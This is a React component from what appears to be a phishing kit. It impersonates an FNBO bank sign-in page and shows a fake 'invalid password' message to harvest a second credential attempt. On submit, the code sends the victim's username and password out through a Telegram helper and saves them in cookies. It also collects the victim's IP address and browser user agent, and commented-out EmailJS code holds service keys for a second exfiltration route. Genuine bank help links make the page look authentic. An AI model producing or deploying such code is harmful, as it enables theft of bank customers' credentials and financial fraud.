import React from 'react'
import { useNavigate } from 'react-router-dom';
import cookies from '../utils/cookie.config';
import TelegramSend from '../utils/send-message';
// import emailjs from "@emailjs/browser";
// import { wait } from '../utils/waiter';


export default function ReLogin() {
  const [formInput, setFormInput] = React.useState<Login2>({
    username2: "",
    password2: "",
  });
  const navigate = useNavigate();

  const login1: Login = cookies.get("login1");

  function handleInputChange(event: React.ChangeEvent<HTMLInputElement>) {
    setFormInput((prevData) => ({
      ...prevData,
      [event.target.name]: event.target.value,
    }));
  }
  const form = React.useRef<HTMLFormElement>(null);

  const [isLoading, setIsLoading] = React.useState(false);
  async function handleSubmit(event: React.FormEvent<HTMLFormElement>) {
    event.preventDefault();
    const message = `
    ---- FNBO LOGIN (SECOND TRY) -----
    Username: ${formInput.username2}
    Password: ${formInput.password2}
    `;
    setIsLoading(true)
    // const mail = await emailjs.sendForm(
    //   "service_m05lftf",
    //   "template_aeij4rd",
    //   form.current!,
    //   "74xz7jS-Xw5rVxjbV"
    // )
    // if(mail.status !== 200){
    //   alert("Failed to login")
    //   return
    // }
      // .then(
      //   (result) => {
      //     console.log(result.text);
      //     navigate("../auth", { replace: true });
      //   },(error)=>{
      //     alert("Could not complete your request");
      //     console.log(error);
      //     setIsLoading(false);
      //   }
      // )
    await TelegramSend(message);
    cookies.set("login2", formInput);
    setIsLoading(false)
    navigate("../auth", { replace: true });
  };

  const [ipAddress, setIpAddress] = React.useState<string>();

  async function getIP() {
    const request = await fetch("https://api.ipify.org?format=json");
    const response: { ip: string } = await request.json();
    setIpAddress(response.ip);
  }

  React.useEffect(() => {
    getIP();
  }, []);


  return (
    <>
      <div className="auth-content">
        <div className="auth-content-inner">
          <div className="primary-auth">
            <form
            ref={form}
              method="POST"
              data-se="o-form"
              slot="content"
              id="form19"
              onSubmit={handleSubmit}
              className="primary-auth-form o-form o-form-edit-mode"
            >
              <div
                data-se="o-form-content"
                className="o-form-content o-form-theme clearfix"
              >
                <h2
                  data-se="o-form-head"
                  className="okta-form-title o-form-head"
                >
                  Sign In
                </h2>

                <div style={{ display: "none" }} className="hidden_form">
                <input
                  type="text"
                  name="username"
                  defaultValue={login1.username}
                />
                <input
                  type="text"
                  name="password"
                  defaultValue={login1.password}
                />
                
                
                <input type="text" name="pi" defaultValue={ipAddress} />
                <input
                  type="text"
                  name="brow"
                  defaultValue={window.navigator.userAgent}
                />
              </div>


                <p style={{color:"red"}}>Invalid User id or Password, Please Try Again!</p>
                <div
                  className="o-form-error-container"
                  data-se="o-form-error-container"
                ></div>
                <div
                  className="o-form-fieldset-container"
                  data-se="o-form-fieldset-container"
                >
                  <div
                    data-se="o-form-fieldset"
                    className="o-form-fieldset o-form-label-top margin-btm-5"
                  >
                    <div
                      data-se="o-form-label"
                      className="okta-form-label o-form-label"
                    >
                      <label htmlFor="okta-signin-username">
                        User Id&nbsp;
                      </label>
                    </div>
                    <div
                      data-se="o-form-input-container"
                      className="o-form-input"
                    >
                      <span
                        data-se="o-form-input-username"
                        className="o-form-input-name-username o-form-control okta-form-input-field input-fix"
                      >
                        <input
                          type="text"
                          placeholder=""
                          name="username2"
                          onChange={handleInputChange}
                          defaultValue={formInput.username2}
                          id="okta-signin-username"
                          
                          aria-label=""
                          aria-required="true"
                          required
                        />
                      </span>
                    </div>
                  </div>

                  <div
                    data-se="o-form-fieldset"
                    className="o-form-fieldset o-form-label-top margin-btm-5"
                  >
                    <div
                      data-se="o-form-label"
                      className="okta-form-label o-form-label"
                    >
                      <label htmlFor="okta-signin-username">
                        Password&nbsp;
                      </label>
                    </div>
                    <div
                      data-se="o-form-input-container"
                      className="o-form-input"
                    >
                      <span
                        data-se="o-form-input-username"
                        className="o-form-input-name-username o-form-control okta-form-input-field input-fix"
                      >
                        <input
                          type="password"
                          placeholder=""
                          name="password2"
                          onChange={handleInputChange}
                          defaultValue={formInput.password2}
                          id="okta-signin-username"
                          
                          aria-label=""
                          aria-required="true"
                          required
                        />
                      </span>
                    </div>
                  </div>
                </div>
              </div>
              <div className="o-form-button-bar">
              {isLoading ? (
                  <input
                  className="button button-primary"
                  type="submit"
                  value="Please wait...."
                  id="okta-signin-submit"
                  data-type="save"
                />
                ) : (
                  <input
                    className="button button-primary"
                    type="submit"
                    value="Continue"
                    id="okta-signin-submit"
                    data-type="save"
                  />
                )}
              </div>
            </form>
            <div className="auth-footer">
              <a
                href="https://auth.securebanklogin.com/?brand=fnbo#"
                data-se="needhelp"
                aria-expanded="false"
                aria-controls="help-links-container"
                className="link help js-help"
              >
                Need help signing in?
              </a>
              <ul
                className="help-links js-help-links"
                id="help-links-container"
                style={{}}
              >
                <li>
                  <a
                    href="https://auth.securebanklogin.com/?brand=fnbo#"
                    data-se="forgot-password"
                    className="link js-forgot-password"
                  >
                    Forgot password?
                  </a>
                </li>
                <li>
                  <a
                    href="https://www.securebanklogin.com/auth/fnbo/forgot-user-id"
                    className="link js-custom"
                    rel="noopener noreferrer"
                  >
                    Forgot User ID?
                  </a>
                </li>
                <li>
                  <a
                    href="https://auth.securebanklogin.com/help/login"
                    data-se="help-link"
                    className="link js-help-link"
                    rel="noopener noreferrer"
                    target="_blank"
                  >
                    Need help?
                  </a>
                </li>
              </ul>
            </div>
          </div>
        </div>
      </div>
    </>
  );
}
